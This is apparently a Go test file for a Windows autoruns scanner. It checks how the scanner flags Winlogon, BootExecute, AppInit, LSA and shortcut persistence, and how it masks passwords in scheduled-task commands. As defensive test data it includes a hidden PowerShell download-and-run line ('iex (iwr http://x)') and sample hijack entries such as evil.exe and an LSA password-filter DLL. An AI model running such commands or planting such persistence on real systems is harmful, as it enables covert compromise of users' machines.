package autoruns

import (
	"reflect"
	"testing"

	"lanterna/internal/scan"
)

func testReader(env *fakeEnv) reader {
	return reader{res: env.resolver(), cl: cleaner{profile: `C:\Users\anna`, user: "anna"}}
}

func TestRegistryHelpers(t *testing.T) {
	if runName("!*Aggiorna") != "Aggiorna" || runName("Normale") != "Normale" {
		t.Error("runName")
	}
	if c, dll := runOnceExFile(`C:\x\a.dll|Install|/q`); c != `C:\x\a.dll` || !dll {
		t.Errorf("RunOnceEx con DLL: %q %v", c, dll)
	}
	if c, dll := runOnceExFile(`C:\x\setup.exe /q`); c != `C:\x\setup.exe /q` || dll {
		t.Errorf("RunOnceEx con comando: %q %v", c, dll)
	}
	if got := splitList(`C:\Windows\system32\userinit.exe, C:\x\evil.exe,`); !reflect.DeepEqual(got, []string{`C:\Windows\system32\userinit.exe`, `C:\x\evil.exe`}) {
		t.Errorf("splitList: %q", got)
	}
	if got := splitAppInit(`C:\PROGRA~1\a.dll,b.dll  "c.dll"`); !reflect.DeepEqual(got, []string{`C:\PROGRA~1\a.dll`, "b.dll", "c.dll"}) {
		t.Errorf("splitAppInit: %q", got)
	}
	if !isDefaultBootExecute("autocheck  autochk   *") || !isDefaultBootExecute("AUTOCHECK autochk *") {
		t.Error("BootExecute predefinito")
	}
	if bootExecuteFile("autocheck autochk *") != `%SystemRoot%\System32\autochk.exe` || bootExecuteFile("sdnclean64.exe /x") != `%SystemRoot%\System32\sdnclean64.exe` {
		t.Error("file di BootExecute")
	}
	if lsaFile("msv1_0") != `%SystemRoot%\System32\msv1_0.dll` || lsaFile(`C:\x\pf.dll`) != `C:\x\pf.dll` || lsaFile("kerberos.dll") != `%SystemRoot%\System32\kerberos.dll` {
		t.Error("lsaFile")
	}
}

func TestWinlogon(t *testing.T) {
	rd := testReader(newFakeEnv())
	for _, c := range []struct {
		value, data string
		hijacks     []bool
	}{
		{"Shell", "explorer.exe", []bool{false}},
		{"Shell", `C:\Windows\explorer.exe`, []bool{false}},
		{"Shell", `%SystemRoot%\explorer.exe`, []bool{false}},
		{"Shell", `explorer.exe, C:\Users\anna\AppData\Roaming\x.exe`, []bool{false, true}},
		{"Shell", `explorer.exe /x`, []bool{true}},
		{"Shell", `cmd.exe`, []bool{true}},
		{"Userinit", `C:\Windows\system32\userinit.exe,`, []bool{false}},
		{"Userinit", `C:\WINDOWS\System32\Userinit.exe`, []bool{false}},
		{"Userinit", `%SystemRoot%\system32\userinit.exe`, []bool{false}},
		{"Userinit", `C:\Windows\system32\userinit.exe,C:\ProgramData\sync.exe`, []bool{false, true}},
	} {
		items := rd.winlogonItems("machine", `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, c.value, c.data)
		var got []bool
		for _, it := range items {
			got = append(got, it.hijack)
			if it.entry.Category != "winlogon" || it.file == "" {
				t.Errorf("%s=%q: voce %+v", c.value, c.data, it)
			}
		}
		if !reflect.DeepEqual(got, c.hijacks) {
			t.Errorf("%s=%q: dirottamenti %v, attesi %v", c.value, c.data, got, c.hijacks)
		}
	}
	items := rd.winlogonItems("machine", "", "Shell", `explorer.exe, C:\Users\anna\AppData\Roaming\x.exe`)
	if items[1].entry.Command != `%USERPROFILE%\AppData\Roaming\x.exe` || items[1].file != `C:\Users\anna\AppData\Roaming\x.exe` {
		t.Errorf("comando sanificato e file vero: %+v", items[1])
	}
}

// La regola di BootExecute è comune al motore (core/src/engine/autoruns.ts):
// gli stessi esempi stanno nelle prove dei due linguaggi.
func TestBootExecuteDefault(t *testing.T) {
	for _, c := range []struct {
		line           string
		def, scheduled bool
	}{
		{"autocheck autochk *", true, false},
		{"autocheck autochk /q /v *", true, false}, // immagini di Azure
		{`autocheck autochk /p \??\C:`, true, true},
		{`autocheck autochk /r \??\D:`, true, true},
		{"autocheck autochk /k:C *", true, false},
		{"AUTOCHECK   Autochk   *", true, false},
		{`autocheck autochk /m \DosDevices\E:`, true, true},
		{`autocheck autochk \??\Volume{0a1b2c3d-1111-2222-3333-444455556666}`, true, true},
		{"autocheck autochk * evil.exe", false, false},
		{"autocheck evil", false, false},
		{"autochk *", false, false},
		{"autocheck autochk", false, false},
		{"autocheck autochk /q", false, false},
		{`autocheck autochk /x:C:\evil.exe *`, false, false},
		{`autocheck autochk \??\C:\evil.exe`, false, false},
		{"autocheck autochk ** ", false, false},
	} {
		def, sch := bootExecuteDefault(c.line)
		if def != c.def || sch != c.scheduled || isDefaultBootExecute(c.line) != c.def {
			t.Errorf("%q: predefinito %v, programmato %v; attesi %v, %v", c.line, def, sch, c.def, c.scheduled)
		}
	}
}

func TestHijackItems(t *testing.T) {
	rd := testReader(newFakeEnv())
	be := rd.bootExecuteItems("HKLM\\x", []string{"autocheck autochk *", "", `autocheck autochk /p \??\C:`, "evil", "autocheck autochk /q /v *"})
	if len(be) != 4 || be[0].hijack || be[0].always || be[1].hijack || !be[1].always || !be[2].hijack || be[3].hijack || be[3].always ||
		be[0].file != `C:\Windows\System32\autochk.exe` || be[2].file != `C:\Windows\System32\evil.exe` {
		t.Errorf("BootExecute: %+v", be)
	}
	// Il controllo del disco programmato si elenca anche se autochk è di
	// Windows; la riga di Azure no.
	be[1].entry.File, be[3].entry.File = msFile("windows"), msFile("windows")
	if windowsEntry(be[1]) || !windowsEntry(be[3]) {
		t.Errorf("controllo programmato elencato, riga di Azure nascosta: %v %v", windowsEntry(be[1]), windowsEntry(be[3]))
	}
	ai := rd.appInitItems("machine32", "HKLM\\y", `C:\Windows\System32\a.dll b.dll`, true)
	if len(ai) != 2 || !ai[0].hijack || !ai[0].entry.Enabled || ai[0].file != `C:\Windows\SysWOW64\a.dll` || ai[1].file != `C:\Windows\SysWOW64\b.dll` {
		t.Errorf("AppInit attivo a 32 bit: %+v", ai)
	}
	if off := rd.appInitItems("machine", "", "a.dll", false); off[0].hijack || off[0].entry.Enabled {
		t.Errorf("AppInit spento: %+v", off)
	}
	lsa := rd.lsaItems("lsa-security", `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`, []string{"kerberos", `""`, "", " msv1_0 ", `C:\Users\anna\AppData\Roaming\pwfilter.dll`})
	if len(lsa) != 3 || lsa[0].file != `C:\Windows\System32\kerberos.dll` || lsa[1].entry.Name != "msv1_0" {
		t.Errorf("LSA: %+v", lsa)
	}
	// Un pacchetto indicato con il percorso completo (T1547.005): il nome è
	// quello della DLL, il percorso resta pulito nel comando.
	if p := lsa[2]; p.entry.Name != "pwfilter.dll" || p.entry.Command != `%USERPROFILE%\AppData\Roaming\pwfilter.dll` || p.file != `C:\Users\anna\AppData\Roaming\pwfilter.dll` {
		t.Errorf("LSA con il percorso: %+v", p)
	}
	env := newFakeEnv(`C:\Windows\System32\spool\prtprocs\x64\winprint.dll`)
	rd = testReader(env)
	dirs := []string{`C:\Windows\System32\spool\prtprocs\W32X86`, `C:\Windows\System32\spool\prtprocs\x64`}
	if got := rd.printProcFile("winprint.dll", dirs); got != `C:\Windows\System32\spool\prtprocs\x64\winprint.dll` {
		t.Errorf("processore di stampa: %q", got)
	}
	if got := rd.printProcFile("altro.dll", dirs); got != `C:\Windows\System32\spool\prtprocs\W32X86\altro.dll` {
		t.Errorf("processore mancante: %q", got)
	}
}

func TestCommandItem(t *testing.T) {
	rd := testReader(newFakeEnv(`C:\Users\anna\AppData\Roaming\Vendor\agent.dll`))
	e := scan.AutorunEntry{Category: "logon", Kind: "run", Name: "x", Enabled: true}
	it := rd.commandItem(e, `rundll32.exe "%APPDATA%\Vendor\agent.dll",Start`, false)
	if it.file != `C:\Windows\System32\rundll32.exe` || it.target != `C:\Users\anna\AppData\Roaming\Vendor\agent.dll` || it.interpreted {
		t.Errorf("rundll32: %+v", it)
	}
	if it.entry.Command != `rundll32.exe "%APPDATA%\Vendor\agent.dll",Start` {
		t.Errorf("comando: %q", it.entry.Command)
	}
	it = rd.commandItem(e, `powershell.exe -w hidden -c "iex (iwr http://x)"`, false)
	if !it.interpreted || it.target != "" {
		t.Errorf("comando interpretato: %+v", it)
	}
	it = rd.commandItem(e, `"C:\Users\anna\AppData\Local\App\app.exe" --tray`, false)
	if it.entry.Command != `"%USERPROFILE%\AppData\Local\App\app.exe" --tray` || it.target != "" || it.interpreted {
		t.Errorf("programma normale: %+v", it)
	}
}

func TestShortcutItem(t *testing.T) {
	rd := testReader(newFakeEnv())
	e := scan.AutorunEntry{Category: "logon", Kind: "folder", Name: "App", Enabled: true}
	lnk := buildLnk(t, lnkSpec{local: `C:\Program Files\App\app.exe`, args: "--startup"})
	it := rd.shortcutItem(e, `C:\Users\anna\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\App.lnk`, lnk)
	if it.file != `C:\Program Files\App\app.exe` || it.entry.Command != `"C:\Program Files\App\app.exe" --startup` {
		t.Errorf("collegamento: %+v", it)
	}
	// Collegamento rovinato o non letto: si mostra il collegamento, senza
	// verificarlo (il .lnk non è il programma).
	it = rd.shortcutItem(e, `C:\x\Rotto.lnk`, []byte("non è un collegamento"))
	if it.file != `C:\x\Rotto.lnk` || !it.unverified {
		t.Errorf("collegamento rovinato: %+v", it)
	}
	if it = rd.shortcutItem(e, `C:\x\NonLetto.lnk`, nil); !it.unverified {
		t.Errorf("collegamento non letto: %+v", it)
	}
	// Collegamento con il solo elenco della shell (app dello Store trascinata
	// da shell:AppsFolder): nessun file di destinazione, nessun falso «senza
	// firma» sul .lnk.
	store := buildLnk(t, lnkSpec{idList: true})
	it = rd.shortcutItem(e, `C:\Users\anna\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Foto.lnk`, store)
	if !it.unverified || it.target != "" {
		t.Errorf("collegamento a un'app dello Store: %+v", it)
	}
	it.entry.File = &scan.FileFacts{Folder: "appData", Signature: &scan.FileSignature{Status: "unsigned"}}
	if windowsEntry(it) {
		t.Error("collegamento non verificato nascosto")
	}
	it = rd.shortcutItem(e, `C:\x\script.vbs`, nil)
	if it.file != `C:\x\script.vbs` || it.unverified {
		t.Errorf("script nella cartella: %+v", it)
	}
}

// Le credenziali scritte nei comandi non si esportano (G6).
func TestCommandSecrets(t *testing.T) {
	rd := testReader(newFakeEnv())
	e := scan.AutorunEntry{Category: "tasks", Kind: "task", Name: "Backup", Enabled: true}
	for _, c := range []struct{ cmd, want string }{
		{`cmd /c net use Z: \\nas\backup Passw0rd! /user:NAS\backupuser && robocopy C:\Dati Z:\ /MIR`,
			`cmd /c net use Z: \\nas\backup ‹password› /user:‹utente› && robocopy C:\Dati Z:\ /MIR`},
		{`curl.exe -u admin:S3greta https://nas.local/api`, `curl.exe -u ‹utente›:‹password› https://nas.local/api`},
		{`C:\Tools\sync.exe --url https://mario:Segreta1@nas.local/dav --password=Altra2 -pw "Terza 3"`,
			`C:\Tools\sync.exe --url https://‹utente›:‹password›@nas.local/dav --password=‹password› -pw ‹password›`},
		{`powershell.exe -File C:\x\b.ps1 -Password Quarta4`, `powershell.exe -File C:\x\b.ps1 -Password ‹password›`},
		{`sc.exe config Svc obj= .\backup password= Quinta5`, `sc.exe config Svc obj= .\backup password= ‹password›`},
		{`C:\App\db.exe "Server=x;User Id=sa;Password=Sesta6;"`, `C:\App\db.exe "Server=x;User Id=sa;Password=‹password›;"`},
		{`schtasks /run /s srv /u admin /p Settima7 /tn x`, `schtasks /run /s srv /u admin /p ‹password› /tn x`},
		{`schtasks /create /tn x /tr C:\x\a.exe /ru NAS\backup /rp Sedici16`, `schtasks /create /tn x /tr C:\x\a.exe /ru ‹utente› /rp ‹password›`},
		{`C:\Tools\PsExec.exe \\srv -u DOM\admin -p Diciassette17 cmd`, `C:\Tools\PsExec.exe \\srv -u ‹utente› -p ‹password› cmd`},
		// net use con la password dopo /user:, o con la condivisione fra
		// virgolette; valori fra apici; password attaccata a -p di 7-Zip e
		// MySQL; ConvertTo-SecureString; --user=.
		{`cmd /c net use Z: \\nas\backup /user:NAS\backupuser Ottava8 && robocopy C:\Dati Z:\`, `cmd /c net use Z: \\nas\backup /user:‹utente› ‹password› && robocopy C:\Dati Z:\`},
		{`net use Z: "\\nas\back up" Nona9 /user:NAS\backup`, `net use Z: "\\nas\back up" ‹password› /user:‹utente›`},
		{`net use Z: \\nas\x /user:NAS\backup "Decima 10"&dir Z:`, `net use Z: \\nas\x /user:‹utente› ‹password›&dir Z:`},
		{`C:\x\backup.exe -Password 'Undici 11' -Log C:\x\b.log`, `C:\x\backup.exe -Password ‹password› -Log C:\x\b.log`},
		{`"C:\Program Files\7-Zip\7z.exe" a -tzip -pDodici12 C:\b.zip C:\Dati`, `"C:\Program Files\7-Zip\7z.exe" a -tzip -p‹password› C:\b.zip C:\Dati`},
		{`cmd /c mysqldump -u root -pTredici13 gestionale > C:\b.sql`, `cmd /c mysqldump -u root -p‹password› gestionale > C:\b.sql`},
		{`powershell -c "$c = ConvertTo-SecureString 'Quattordici14' -AsPlainText -Force"`, `powershell -c "$c = ConvertTo-SecureString ‹password› -AsPlainText -Force"`},
		{`curl.exe --user=admin:Quindici15 https://nas.local`, `curl.exe --user=‹utente›:‹password› https://nas.local`},
		{`net use Z: \\nas\x /p:yes`, `net use Z: \\nas\x /p:yes`},
		{`net use Z: \\nas\x * /user:NAS\backup`, `net use Z: \\nas\x * /user:‹utente›`},
		{`net use Z: /delete /y`, `net use Z: /delete /y`},
		{`C:\Tools\app.exe -print -port 80`, `C:\Tools\app.exe -print -port 80`},
		{`powershell -c "ConvertTo-SecureString $env:PW -AsPlainText"`, `powershell -c "ConvertTo-SecureString $env:PW -AsPlainText"`},
		// Nessuna credenziale: nulla cambia.
		{`C:\Windows\system32\svchost.exe -k netsvcs -p`, `C:\Windows\system32\svchost.exe -k netsvcs -p`},
		{`C:\Windows\system32\svchost.exe -k UnistackSvcGroup -p -s CDPUserSvc`, `C:\Windows\system32\svchost.exe -k UnistackSvcGroup -p -s CDPUserSvc`},
		{`xcopy C:\a D:\b /p /y`, `xcopy C:\a D:\b /p /y`},
		{`python.exe -u C:\x\run.py`, `python.exe -u C:\x\run.py`},
		{`regsvr32.exe /s /u C:\x\a.dll`, `regsvr32.exe /s /u C:\x\a.dll`},
		{`net use * \\nas\x /persistent:no`, `net use * \\nas\x /persistent:no`},
		{`"C:\Program Files\App\app.exe" --tray`, `"C:\Program Files\App\app.exe" --tray`},
	} {
		it := rd.commandItem(e, c.cmd, false)
		if it.entry.Command != c.want {
			t.Errorf("comando\n %q\nmostrato\n %q\natteso\n %q", c.cmd, it.entry.Command, c.want)
		}
	}
	// Il file e il file eseguito vengono dal comando originale.
	it := rd.commandItem(e, `cmd /c net use Z: \\nas\backup Passw0rd! /user:NAS\backupuser`, false)
	if it.file != `C:\Windows\System32\cmd.exe` {
		t.Errorf("file: %q", it.file)
	}
	// BootExecute non si maschera: «/p \??\C:» è il controllo del disco.
	if be := rd.bootExecuteItems("HKLM\\x", []string{`autocheck autochk /p \??\C:`}); be[0].entry.Command != `autocheck autochk /p \??\C:` {
		t.Errorf("BootExecute: %q", be[0].entry.Command)
	}
}
